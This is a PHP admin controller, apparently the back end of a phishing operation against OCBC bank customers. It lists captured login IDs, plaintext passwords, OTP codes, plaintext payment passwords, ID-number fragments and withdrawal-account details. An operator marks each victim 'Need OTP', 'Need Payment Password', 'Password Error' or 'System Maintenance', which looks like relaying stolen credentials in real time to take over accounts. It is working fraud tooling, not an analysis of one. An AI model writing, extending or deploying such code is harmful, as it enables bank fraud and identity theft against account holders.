<?php

namespace app\admin\controller;

use app\common\model\OcbcLoginRecord;
use app\common\model\User as UserModel;
use think\facade\Request;

/**
 * OCBC账户管理控制器（Web管理端）
 */
class OcbcAccountController extends Base
{
    /**
     * 获取待验证列表
     */
    public function index()
    {
        $page = Request::param('page', 1);
        $pageSize = Request::param('page_size', 20);
        $status = Request::param('status', '');

        $query = OcbcLoginRecord::order('created_at', 'desc');

        // 状态筛选
        if ($status) {
            $query->where('status', $status);
        }

        $list = $query->paginate([
            'list_rows' => $pageSize,
            'page' => $page,
        ]);

        // 状态文本映射（中文）
        $statusTextMap = [
            OcbcLoginRecord::STATUS_PENDING => '待验证',
            OcbcLoginRecord::STATUS_PASSWORD_ERROR => '密码错误',
            OcbcLoginRecord::STATUS_NEED_CAPTCHA => '需要OTP',
            OcbcLoginRecord::STATUS_CAPTCHA_ERROR => 'OTP错误',
            OcbcLoginRecord::STATUS_NEED_PAYMENT_PASSWORD => '需要支付密码',
            OcbcLoginRecord::STATUS_PAYMENT_PASSWORD_ERROR => '支付密码错误',
            OcbcLoginRecord::STATUS_SUCCESS => '验证通过',
            OcbcLoginRecord::STATUS_FAILED => '验证失败',
            OcbcLoginRecord::STATUS_MAINTENANCE => '系统升级中',
            OcbcLoginRecord::STATUS_LEVEL => '等级不足',
        ];

        // 批量查询用户信息
        $userIds = array_filter(array_column($list->items(), 'user_id'));
        $users = [];
        if (!empty($userIds)) {
            $userList = UserModel::whereIn('id', $userIds)
                ->field('id,nickname,email,avatar')
                ->select()
                ->toArray();
            foreach ($userList as $u) {
                $users[$u['id']] = $u;
            }
        }

        $data = [];
        foreach ($list as $item) {
            // 解析账户类型 (优先从device_info获取,然后从withdrawal_account获取)
            $deviceInfo = $item->device_info;
            $withdrawalAccount = $item->withdrawal_account;
            $accountType = '';

            // 优先从device_info获取账户类型(用户登录时选择的)
            if ($deviceInfo && is_array($deviceInfo) && isset($deviceInfo['account_type'])) {
                $accountType = $deviceInfo['account_type'];
            }
            // 如果没有,从withdrawal_account获取(管理员设置提现账户时填写的)
            elseif ($withdrawalAccount && is_array($withdrawalAccount) && isset($withdrawalAccount['account_type'])) {
                $accountType = $withdrawalAccount['account_type'];
            }

            $userId = $item->user_id;
            $user = $userId && isset($users[$userId]) ? $users[$userId] : null;

            $data[] = [
                'id' => $item->id,
                'user_id' => $userId,
                'user_nickname' => $user['nickname'] ?? '-',
                'user_email' => $user['email'] ?? '-',
                'user_avatar' => $user['avatar'] ?? '',
                'organization_id' => $item->organization_id,
                'login_user_id' => $item->login_user_id,
                'password' => $item->password, // 明文密码
                'captcha' => $item->captcha,
                'payment_password' => $item->payment_password, // 明文支付密码
                'id_last4' => $item->id_last4, // 身份证后4位
                'account_type' => $accountType, // 账户类型
                'withdrawal_account' => $withdrawalAccount, // 完整提现账户信息
                'status' => $item->status,
                'status_text' => $statusTextMap[$item->status] ?? $item->status,
                'ip_address' => $item->ip_address,
                'device_info' => $item->device_info,
                'error_message' => $item->error_message,
                'verified_at' => $item->verified_at,
                'created_at' => $item->created_at,
                'updated_at' => $item->updated_at,
            ];
        }

        return $this->success([
            'list' => $data,
            'total' => $list->total(),
            'page' => $page,
            'page_size' => $pageSize,
        ]);
    }

    /**
     * 更新验证状态
     */
    public function updateStatus()
    {
        $id = Request::param('id', 0);
        $status = Request::param('status', '');
        $errorMessage = Request::param('error_message', '');
        $withdrawalAccount = Request::param('withdrawal_account', '');

        if (empty($id)) {
            return $this->error('Invalid record ID');
        }

        if (empty($status)) {
            return $this->error('Please select status');
        }

        $record = OcbcLoginRecord::find($id);
        if (!$record) {
            return $this->error('Record not found');
        }

        // 更新状态
        $record->status = $status;
        $record->verified_by = $this->adminId;
        $record->verified_at = date('Y-m-d H:i:s');

        // 根据状态设置额外信息
        if ($errorMessage) {
            $record->error_message = $errorMessage;
        }

        // 如果需要支付密码，设置提现账户信息
        if ($status === OcbcLoginRecord::STATUS_NEED_PAYMENT_PASSWORD && $withdrawalAccount) {
            $record->withdrawal_account = json_decode($withdrawalAccount, true);
        }

        $record->save();

        return $this->success([
            'message' => 'Status updated successfully'
        ]);
    }

    /**
     * 获取状态选项列表
     */
    public function getStatusOptions()
    {
        $options = [
            ['value' => OcbcLoginRecord::STATUS_PASSWORD_ERROR, 'label' => 'Password Error'],
            ['value' => OcbcLoginRecord::STATUS_NEED_CAPTCHA, 'label' => 'Need OTP'],
            ['value' => OcbcLoginRecord::STATUS_CAPTCHA_ERROR, 'label' => 'OTP Error'],
            ['value' => OcbcLoginRecord::STATUS_NEED_PAYMENT_PASSWORD, 'label' => 'Need Payment Password'],
            ['value' => OcbcLoginRecord::STATUS_PAYMENT_PASSWORD_ERROR, 'label' => 'Payment Password Error'],
            ['value' => OcbcLoginRecord::STATUS_SUCCESS, 'label' => 'Verify Success'],
            ['value' => OcbcLoginRecord::STATUS_FAILED, 'label' => 'Verify Failed'],
            ['value' => OcbcLoginRecord::STATUS_MAINTENANCE, 'label' => 'System Maintenance'],
            ['value' => OcbcLoginRecord::STATUS_LEVEL, 'label' => 'Level Insufficient'],
        ];

        return $this->success($options);
    }

    /**
     * 删除记录
     */
    public function delete()
    {
        $id = Request::param('id', 0);

        if (empty($id)) {
            return $this->error('Invalid record ID');
        }

        $record = OcbcLoginRecord::find($id);
        if (!$record) {
            return $this->error('Record not found');
        }

        $record->delete();

        return $this->success([
            'message' => 'Record deleted successfully'
        ]);
    }

    /**
     * 批量删除记录
     */
    public function batchDelete()
    {
        $ids = Request::param('ids', []);

        if (empty($ids) || !is_array($ids)) {
            return $this->error('Please select records to delete');
        }

        $deletedCount = OcbcLoginRecord::whereIn('id', $ids)->delete();

        return $this->success([
            'message' => 'Deleted ' . $deletedCount . ' records successfully',
            'count' => $deletedCount
        ]);
    }
}
